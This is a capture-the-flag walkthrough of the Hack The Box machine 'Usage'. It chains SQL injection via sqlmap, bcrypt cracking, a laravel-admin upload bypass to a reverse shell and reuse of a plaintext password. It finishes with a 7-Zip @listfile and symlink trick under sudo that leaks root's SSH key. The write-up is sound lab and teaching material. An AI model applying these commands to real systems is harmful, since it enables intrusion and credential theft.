---
title: "Usage"
---

# Usage

![Cap dashboard screenshot](usage.png)

Usage is an easy Linux Hack The Box machine that starts with a SQL injection in a password reset form, continues with credential reuse on an admin panel, and ends with a 7-Zip command-line abuse path to root.

## Reconnaissance

An initial scan showed SSH on port 22 and HTTP on port 80.

```text
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

The web server redirected to `usage.htb`, so I added that hostname to `/etc/hosts` before exploring the site.

## Web Enumeration

The application presented Login, Register, and Admin links. The Admin link pointed to `admin.usage.htb` and also exposed a separate login form.

![Cap dashboard screenshot](usage-1.png)

After registering a normal account and logging in, I saw a dashboard with featured blogs, but nothing immediately useful beyond a hint that the backend was Laravel-based.

![Cap dashboard screenshot](usage-2.png)

The login page also offered password reset functionality. The application revealed whether an email address existed, which made account enumeration possible.

![Cap dashboard screenshot](usage-3.png)

## SQL Injection

Intercepting the password reset request in Burp showed two parameters: `_token` and `email`. Testing the email field with a single quote caused an error, while adding a comment marker returned the expected page, which suggested SQL injection.

I saved the request to a file and fed it to `sqlmap`.

```bash
sqlmap --level 5 --risk 3 --threads 10 --batch -r reset-password.req
```

`sqlmap` confirmed a boolean-based blind SQL injection in the `email` parameter and identified the backend as MySQL.

```text
(custom) POST parameter '#1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable
the back-end DBMS is MySQL
```

I dumped the tables from the `usage_blog` database and found both `admin_users` and `users` among 15 tables.

```text
Database: usage_blog
[15 tables]
+------------------------+
| admin_menu             |
| admin_operation_log    |
| admin_permissions      |
| admin_role_menu        |
| admin_role_permissions |
| admin_role_users       |
| admin_users            |
| blog                   |
| failed_jobs            |
| migrations             |
| password_reset_tokens  |
| personal_access_tokens |
| users                  |
+------------------------+
```

Dumping `admin_users` revealed a single administrator account with a bcrypt hash.

```text
| id | name          | avatar  | password                                                     | username | created_at          | updated_at          | remember_token                                               |
| 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |
```

Cracking the hash with `john` and `rockyou.txt` recovered the password `whatever1`, which worked on the admin dashboard at `admin.usage.htb`.

![Cap dashboard screenshot](usage-4.png)

## Admin Panel

The dashboard showed environment details and confirmed the panel was powered by `encore/laravel-admin` version 1.8.18.

A search for that version led to `CVE-2023-24249` https://github.com/advisories/GHSA-g857-47pm-3r32 & POC https://github.com/ldb33/CVE-2023-24249-PoC, which allows remote code execution by abusing profile picture uploads. The trick is to upload an image while injecting a `.php` extension into the filename.

I renamed a reverse shell to `.png` for upload, then intercepted the request and changed the filename to include `.php`. After the upload completed, the file appeared under `/upload/images/`.

Triggering the uploaded file gave me a shell as `dash`.

## User Escalation

### Shell as xander

Inside `dash`’s home directory, I found files related to M/Monit. One of them, `.monitrc`, contained a plaintext password.

```text
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd
```

That password did not work for `dash`, but it did work for the user `xander`, which gave me another shell and the first flag.

## Root Access

### Sudo permissions

The `xander` account could run `/usr/bin/usage_management` as any user without a password.

```text
User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
```

The binary offered three options:

- Project Backup.
- Backup MySQL data.
- Reset admin password.

`strings` on the binary showed that the project backup feature used 7-Zip on the contents of `/var/www/html`.

```text
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql
Password has been reset.
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
```

The backup feature was the most interesting, because `7za` can treat specially named files as list files. By creating a file named `@ssh_key` and a symlink named `ssh_key` pointing to `/root/.ssh/id_rsa`, I could make 7-Zip attempt to process the root private key during backup.

```bash
cd /var/www/html
touch @ssh_key
ln -s /root/.ssh/id_rsa ssh_key
sudo /usr/bin/usage_management
```

Choosing option 1 caused 7-Zip to print the contents of root’s SSH private key as warnings:

```text
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

I copied the key into a file, fixed the permissions with `chmod 600`, and used it to SSH in as root.

## Attack Path

- Enumerate SSH and the `usage.htb` web application.
- Discover the admin subdomain and password reset flow.
- Exploit SQL injection in the email field.
- Dump the `usage_blog` database and crack the admin bcrypt hash.
- Log in to the Laravel admin panel.
- Abuse the profile image upload to gain a shell as `dash`.
- Reuse the Monit password to switch to `xander`.
- Abuse sudo access to run the 7-Zip backup utility.
- Use a symlink and `@` list-file behavior to read `/root/.ssh/id_rsa`.
- Log in as root with the recovered key.
